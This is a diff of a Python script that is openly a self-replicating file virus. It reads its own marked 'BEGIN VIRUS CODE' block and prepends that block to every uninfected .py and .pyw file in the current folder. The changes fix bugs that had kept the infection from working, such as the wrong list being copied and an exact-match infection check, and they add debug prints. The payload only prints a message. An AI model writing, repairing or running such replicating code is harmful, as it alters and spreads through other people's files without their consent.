@@ -6,7 +6,7 @@
 	2. Infect other python files with the virus replication code
 	3. Execute/implement the virus code to the system
 
-	* It is paramount that the comment for "BEGING VIRUS CODE"
+	* It is paramount that the comment for "BEGIN VIRUS CODE"
 	 remains otherwise change the string for replication below
 '''
 
@@ -23,13 +23,13 @@ this_file = sys.argv[0]
 lines = []
 
 with open(this_file, 'r') as f:
-	lines = f.readlines()
+	this_file_lines = f.readlines()
 
 # mark which portion of the file (the virus code) should be passed to other files
 self_replicating_portion_of_code = False
 
 # go through the file to be infected
-for line in lines:
+for line in this_file_lines:
 
 	print("reading line --> %s" % line)
 
@@ -46,18 +46,22 @@ for line in lines:
 # 2. INFECT OTHER PYTHON FILES
 other_python_files = glob('*.py') + glob('*.pyw')
 
-for file in other_python_files:
-	print("checking file %s" % file)
+for i in other_python_files:
+	print(i)
+
+for other_file in other_python_files:
+	print("checking file %s" % other_file)
 	
 	# set check for whether file is already infected by us
 	already_infected = False
 	innocent_files_code = []
 
-	with open(file,'r') as f:
+	with open(other_file,'r') as f:
 		innocent_files_code = f.readlines()
 
 	for line in innocent_files_code:
-		if line == "# BEGIN VIRUS CODE":
+		if "# BEGIN VIRUS CODE" in line:
+			print("already infected. i shouldnt do anything with this file... ")
 			already_infected = True
 
 	# reset the code to include the virus at the top of that file
@@ -67,17 +71,25 @@ for file in other_python_files:
 		other_files_code = []
 		other_files_code.extend(virus_code)
 		other_files_code.extend('\n')
-		other_files_code.extend(other_files_code)
+		other_files_code.extend(innocent_files_code)
+
+
+
+		print(other_files_code)
 
 		# finally, rewrite the other file
-		with open(file, 'w') as f:
+		with open(other_file, 'w') as f:
 			f.writelines(other_files_code)
+
+	else:
+		print("not touching it!")
 
 
 # 3. WRITE VIRUS INSTRUCTIONS
 def malicious_code():
-	print("YOU HAVE BEEN INFECTED HAHAHA !!!")
+	print("YOU HAVE BEEN INFECTED!!!")
 
 
 malicious_code()
 # END VIRUS CODE
+
